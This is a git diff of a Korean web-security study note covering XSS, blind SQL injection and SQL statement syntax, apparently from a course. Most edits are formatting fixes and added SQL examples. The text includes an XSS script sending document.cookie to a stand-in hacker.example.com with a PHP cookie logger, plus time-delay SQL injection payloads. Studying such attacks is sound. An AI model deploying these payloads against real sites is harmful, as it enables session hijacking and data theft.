@@ -17,8 +17,8 @@ tags:
 - 웹 페이지에 스크립트를 삽입할 수 있는 취약점
 - JavaScript를 통해 공격이 이루어짐
 
-```
-msg 파라미터를 출력하는 xss.php 예제
+```php
+/*msg 파라미터를 출력하는 xss.php 예제*/
 <?
   echo $_GET['msg'];
 ?>
@@ -52,13 +52,13 @@ msg 파라미터를 출력하는 xss.php 예제
     2. 관리자가 이메일 확인하자마자 스크립트에 의해 해커의 서버로 쿠키 정보와 함께 이동
     3. log.txt에 쿠키 정보 기록
 
-    ```
-    해커의 서버(http://hacker.example.com)로 클라이언트의 쿠키 전송
+    ```php
+    /*해커의 서버(http://hacker.example.com)로 클라이언트의 쿠키 전송*/
     <script>
       window.location = 'http://hacker.example.com/xss.php?log=' + document.cookie
     </script>
 
-    파라미터를 log.txt에 저장하는 xss.php
+    /*파라미터를 log.txt에 저장하는 xss.php*/
     <?
       $fp = fopen("log.txt","a+");
       fwrite($fp,$_GET['log']);
@@ -226,7 +226,7 @@ msg 파라미터를 출력하는 xss.php 예제
           - MySQL
             - sleep 함수 `SLEEP(duration)`
             - benchmark 함수 - expr 식을 count 수만큼 실행하며 시간지연이 발생 `BENCHMARK(count, expr)`
-            - heavy query
+            - heavy query  
               `information_schema.tables` 테이블은 MySQL 에서 기본적으로 제공하는 시스템 테이블이며  
               기본적으로 많은 수의 데이터가 포함되어 있는 테이블이다
               이러한 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간 지연
@@ -234,7 +234,8 @@ msg 파라미터를 출력하는 xss.php 예제
             - waitfor `waitfor delay 'time_to_pass';`
             - heavy query
           - SQLite
-            - heavy query `LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))`
+            - heavy query  
+              `LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))`
 
       - _Error Based Blind_
 
@@ -260,16 +261,16 @@ msg 파라미터를 출력하는 xss.php 예제
 
         - _bit 연산_
           - ASCII는 7개의 비트를 통해 하나의 문자를 나타냄
-          - 7번의 요청을 통해 한 바이트를 획들할 수 있음
+          - 7번의 요청을 통해 한 바이트를 획득할 수 있음
 
       - **Blind SQL Injection Tip-2**
 
         - Blind SQL Injection은 다수의 요청을 통해 결과를 획득하는 공격 기법
-        - 사용자가 직접 입력하는 방식은 물리적 한계 -> 스크립트를 작성하여 공격 수행
+        - 사용자가 직접 입력하는 방식은 물리적 한계 => 스크립트를 작성하여 공격 수행
 
         - 예시
 
-          ```
+          ```python
           #!/usr/bin/env python3
           import requests
           URL = "http://sqltest.dreamhack.io"
@@ -307,11 +308,11 @@ msg 파라미터를 출력하는 xss.php 예제
   [LIMIT {[offset,] row_count | row_count OFFSET offset}]
   ```
 
-  - _SELECT_ - 문자열을 시작으로 조회의 결과로 사용될 표현식 또는 컬럼들에 대해 정의
-  - _FROM_ 절에서는 데이터를 조회하기 위한 테이블의 이름 입력
-  - _WHERE_ 절에서는 해당 테이블내에 조회하는 데이터의 조건 설정
-  - _ORDER BY_ 절은 쿼리의 결과 값들을 원하는 컬럼을 기준으로 정렬
-  - _LIMIT_ 절은 쿼리의 결과로 출력될 row의 개수를 또는 Offset을 지정
+  - **SELECT** - 문자열을 시작으로 조회의 결과로 사용될 표현식 또는 컬럼들에 대해 정의
+  - **FROM** 절에서는 데이터를 조회하기 위한 테이블의 이름 입력
+  - **WHERE** 절에서는 해당 테이블내에 조회하는 데이터의 조건 설정
+  - **ORDER BY** 절은 쿼리의 결과 값들을 원하는 컬럼을 기준으로 정렬
+  - **LIMIT** 절은 쿼리의 결과로 출력될 row의 개수를 또는 Offset을 지정
 
 - **INSERT**
 
@@ -329,8 +330,15 @@ msg 파라미터를 출력하는 xss.php 예제
       }
   ```
 
-  - _INSERT_ 문자열을 시작으로 INSERT 구문이 시작하며, 데이터가 추가될 테이블을 정의
-  - _VALUE[ S ]_ 절에서는 추가될 데이터의 값을 입력
+  - **INSERT** 문자열을 시작으로 INSERT 구문이 시작하며, 데이터가 추가될 테이블을 정의
+  - **VALUE[ S ]** 절에서는 추가될 데이터의 값을 입력
+  - `,`를 통해 여러 데이터를 한번에 추가할 수도 있음
+
+    ```
+      INSERT
+        INTO boards (title, boardcontent)
+        VALUES ('title 1', 'content 1'), ('title 2', 'content 2');
+    ```
 
 - **UPDATE**
 
@@ -343,13 +351,20 @@ msg 파라미터를 출력하는 xss.php 예제
         [WHERE where_condition]
     ```
 
-    - _UPDATE_ 문자열을 시작으로 수정을 요청할 테이블 정의
-    - _SET_ 절에서는 수정할 컬럼과 수정될 데이터를 정의
-    - _WHERE_ 절을 통해 수정할 row 지정
+    - **UPDATE** 문자열을 시작으로 수정을 요청할 테이블 정의
+    - **SET** 절에서는 수정할 컬럼과 수정될 데이터를 정의
+    - **WHERE** 절을 통해 수정할 row 지정
+
+    ```
+    UPDATE boards
+    SET boardcontent = "update content 2"
+    WHERE title = 'title 1';
+    ```
 
 - **DELETE**
 
   - 데이터를 삭제하는 구문
+
     ```
     # mysql DELETE https://dev.mysql.com/doc/refman/8.0/en/delete.html
     DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
@@ -358,8 +373,14 @@ msg 파라미터를 출력하는 xss.php 예제
         [ORDER BY ...]
         [LIMIT row_count]
     ```
-    - _DELETE FROM_ 문자열을 시작으로 삭제할 데이터가 존재하는 테이블 정의
-    - _WHERE_ 절을 통해 삭제할 데이터의 row 지정
+
+    - **DELETE FROM** 문자열을 시작으로 삭제할 데이터가 존재하는 테이블 정의
+    - **WHERE** 절을 통해 삭제할 데이터의 row 지정
+
+    ```
+    DELETE FROM boards
+    WHERE title = 'title 1';
+    ```
 
   ### Exploit Technique
 
